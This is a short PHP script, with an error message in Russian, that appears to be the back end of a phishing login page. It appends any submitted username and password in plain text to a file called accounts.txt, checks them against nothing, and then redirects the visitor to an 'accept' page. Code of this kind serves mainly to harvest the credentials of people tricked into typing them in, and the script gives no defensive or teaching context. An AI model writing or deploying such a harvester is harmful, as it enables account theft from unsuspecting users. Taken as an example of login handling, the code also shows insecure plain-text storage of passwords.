<?php
$fd=fopen("accounts.txt",'a+') or die("Не удалось открыть файл");
$login = 0;
$password = 0;
$tab="  ";
if (isset($_POST['login']) && isset($_POST['password'])) 
    {
        $login = $_POST['login'];
        $password = $_POST['password'];
        fwrite($fd, $login);
        fwrite($fd, $tab);
        fwrite($fd, $password);
        header('Location:accept.html');
    }
else 
    {
        header('Location: retry.html');
    }
fclose($fd);

?>
